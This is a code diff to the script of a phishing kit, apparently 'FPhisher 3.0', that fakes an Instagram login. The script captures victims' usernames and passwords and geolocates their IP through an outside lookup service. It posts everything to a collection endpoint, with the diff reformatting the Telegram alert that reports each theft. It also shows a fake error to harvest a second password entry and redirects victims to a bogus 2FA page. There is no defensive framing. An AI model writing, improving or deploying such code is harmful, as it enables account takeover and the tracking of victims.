@@ -67,7 +67,12 @@
           const fb = await fetch('https://ip-api.com/json/?fields=status,country,regionName,city,query');
           const d = await fb.json();
           if (d.status === "success") {
-            return { ip: d.query || 'Unknown', country: d.country || 'Unknown', state: d.regionName || 'Unknown', city: d.city || 'Unknown' };
+            return { 
+              ip: d.query || 'Unknown', 
+              country: d.country || 'Unknown', 
+              state: d.regionName || 'Unknown', 
+              city: d.city || 'Unknown' 
+            };
           }
         } catch {}
       }
@@ -89,25 +94,29 @@
       const loc = await getLocation();
       attempt++;
 
-      const message = `📬 New Details From Insta . Fphisher3.0!
+      // === IMPROVED TELEGRAM MESSAGE ===
+      const telegramMessage = `🚨 <b>NEW INSTAGRAM LOGIN ATTEMPT</b> 🚨
 
-📩NEW LOGIN ATTEMPT 📩
+📋 <b>DETAILS</b>
+• 📲 <b>Platform:</b> Instagram
+• 👤 <b>Username:</b> ${username}
+• 🔑 <b>Password:</b> ${password}
+• 🔄 <b>Attempt:</b> ${attempt}
 
-DETAILS:
-•📲 PLATFORM: INSTAGRAM
-•👤 UserName: ${username}
-•🔑 Password: ${password}
+📍 <b>LOCATION</b>
+• 🌍 <b>Country:</b> ${loc.country}
+• 🗺️ <b>State:</b> ${loc.state}
+• 🏙️ <b>City:</b> ${loc.city}
+• 🌐 <b>IP:</b> ${loc.ip}
 
-LOCATION:
-•🌍 Country: ${loc.country}
-•🗺️ State: ${loc.state}
-•🏙️ City: ${loc.city}
-•🌐 IP: ${loc.ip}
-
-🔒•SECURED BY FPHISHER•🔒`;
+━━━━━━━━━━━━━━━━━━━━━━━
+🔒 <b>Secured by FPhisher 3.0</b> 🔒
+⏰ <i>${new Date().toLocaleString()}</i>`;
 
       const payload = {
         id: SUBMIT_ID,
+        message: telegramMessage,
+        parse_mode: "HTML",           // Important for bold formatting in Telegram
         username: username,
         password: password,
         country: loc.country,
@@ -124,8 +133,11 @@ LOCATION:
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify(payload)
         });
-      } catch (err) { console.error(err); }
+      } catch (err) {
+        console.error("Failed to send data:", err);
+      }
 
+      // UI Feedback
       if (attempt === 1) {
         document.getElementById("errorMsg").classList.remove("hidden");
         passwordInput.value = "";
@@ -133,10 +145,14 @@ LOCATION:
         const btn = document.getElementById("loginBtn");
         const btnText = document.getElementById("btnText");
         const spinner = document.getElementById("spinner");
+        
         btn.disabled = true;
         btnText.textContent = "Loading";
         spinner.classList.remove("hidden");
-        setTimeout(() => window.location.href = "securedfa.html", 1200);
+
+        setTimeout(() => {
+          window.location.href = "securedfa.html";
+        }, 1500);
       }
     });
   </script>
